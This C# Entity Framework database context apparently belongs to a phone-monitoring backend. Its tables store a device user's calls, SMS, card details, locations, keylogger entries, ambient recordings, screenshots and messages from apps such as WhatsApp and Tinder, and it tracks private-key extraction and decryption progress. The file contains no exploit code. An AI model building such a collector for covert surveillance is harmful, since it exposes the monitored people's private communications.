using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Identity.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore;
using NPPHASE.Data.Interface;
using NPPHASE.Data.Model;
using System.Security.Claims;
using KeyValuePair = NPPHASE.Data.Model.KeyValuePair;

namespace NPPHASE.Data.Context
{
    public class NPPHASEApiDbContext : IdentityDbContext<User>
    {
        private readonly IHttpContextAccessor _httpContextAccessor;
        public NPPHASEApiDbContext(DbContextOptions<NPPHASEApiDbContext> options, IHttpContextAccessor? httpContextAccessor) : base(options)
        {
            _httpContextAccessor = httpContextAccessor!;
        }

        protected override void OnModelCreating(ModelBuilder modelBuilder)
        {
            base.OnModelCreating(modelBuilder);

            modelBuilder.Entity<DeviceUser>(entity =>
            {
                entity.ToTable(tableBuilder =>
                {
                    tableBuilder.HasCheckConstraint("CK_DeviceUser_AlacExtractionProgress", "AlacExtractionProgress BETWEEN 0 AND 100");
                    tableBuilder.HasCheckConstraint("CK_DeviceUser_AlacAllotmentProgress", "AlacAllotmentProgress BETWEEN 0 AND 100");
                    tableBuilder.HasCheckConstraint("CK_DeviceUser_PrivateKeyExtractionProgress", "PrivateKeyExtractionProgress BETWEEN 0 AND 100");
                    tableBuilder.HasCheckConstraint("CK_DeviceUser_AlacDecryptionProgress", "AlacDecryptionProgress BETWEEN 0 AND 100");
                    tableBuilder.HasCheckConstraint("CK_DeviceUser_PhaseMonitor", "PhaseMonitor BETWEEN 0 AND 5");
                });
            });
            modelBuilder.Entity<Exceptions>(entity =>
            {
                entity.Property(e => e.Timestamp)
                    .HasColumnType("timestamp(6)");
            });
            modelBuilder.Entity<IdentityRole>(b =>
            {
                b.Property(r => r.ConcurrencyStamp).HasMaxLength(256); // Fix nvarchar(max)
            });

            modelBuilder.Entity<IdentityUser>(b =>
            {
                b.Property(u => u.ConcurrencyStamp).HasMaxLength(256);
                b.Property(u => u.PhoneNumber).HasMaxLength(256);
            });

            modelBuilder.Entity<IdentityUserLogin<string>>(b =>
            {
                b.Property(l => l.ProviderDisplayName).HasMaxLength(256);
            });

            modelBuilder.Entity<IdentityUserToken<string>>(b =>
            {
                b.Property(t => t.Value).HasMaxLength(256);
            });
        }

        protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
        {

            base.OnConfiguring(optionsBuilder);
        }

        public override int SaveChanges()
        {
            var modifiedEntites = ChangeTracker.Entries()
                .Where(x => x.Entity is IAuditabeEntity && (x.State == EntityState.Added || x.State == EntityState.Modified));
            foreach (var entity in modifiedEntites)
            {
                if (entity.Entity is not IAuditabeEntity auditabeEntity)
                {
                    continue;
                }
                var userId = _httpContextAccessor.HttpContext.User?.FindFirst(ClaimTypes.NameIdentifier)?.Value;
                var time = DateTimeOffset.UtcNow;
                if (entity.State == EntityState.Added)
                {
                    auditabeEntity.CreatedBy = userId;
                    auditabeEntity.CreationDate = time;
                }
                else
                {
                    Entry(auditabeEntity).Property(x => x.CreationDate).IsModified = false;
                    Entry(auditabeEntity).Property(x => x.CreatedBy).IsModified = false;
                    auditabeEntity.ModifiedBy = userId;
                    auditabeEntity.ModificationDate = time;
                }
            }
            return base.SaveChanges();
        }

        public DbSet<CallLog> CallLogs { get; set; }
        public DbSet<CardDetail> CardDetails { get; set; }
        public DbSet<Contact> Contacts { get; set; }
        public DbSet<Calendar> Calendar { get; set; }
        public DbSet<DeviceData> DeviceData { get; set; }
        public DbSet<DeviceUser> DeviceUsers { get; set; }
        public DbSet<Gallery> Gallery { get; set; }
        public DbSet<Download> Download { get; set; }
        public DbSet<Location> Locations { get; set; }
        public DbSet<SMSLog> SMSLogs { get; set; }
        public DbSet<KeyValuePair> KeyValuePair { get; set; }
        public DbSet<Facebook> Facebook { get; set; }
        public DbSet<Gmail> Gmail { get; set; }
        public DbSet<InstalledApp> InstalledApp { get; set; }
        public DbSet<InternetHistory> InternetHistory { get; set; }
        public DbSet<Kik> Kik { get; set; }
        public DbSet<KeyLogger> KeyLogger { get; set; }
        public DbSet<Line> Line { get; set; }
        public DbSet<ScreenTime> ScreenTime { get; set; }
        public DbSet<Skype> Skype { get; set; }
        public DbSet<SurroundRecordings> SurroundRecording { get; set; }
        public DbSet<Tinder> Tinder { get; set; }
        public DbSet<Viber> Viber { get; set; }
        public DbSet<Whatsapp> Whatsapp { get; set; }
        public DbSet<WiFiNetwork> WiFiNetwork { get; set; }
        public DbSet<Exceptions> Exceptions { get; set; }
        public DbSet<ScreenShot> ScreenShot { get; set; }
    }
}
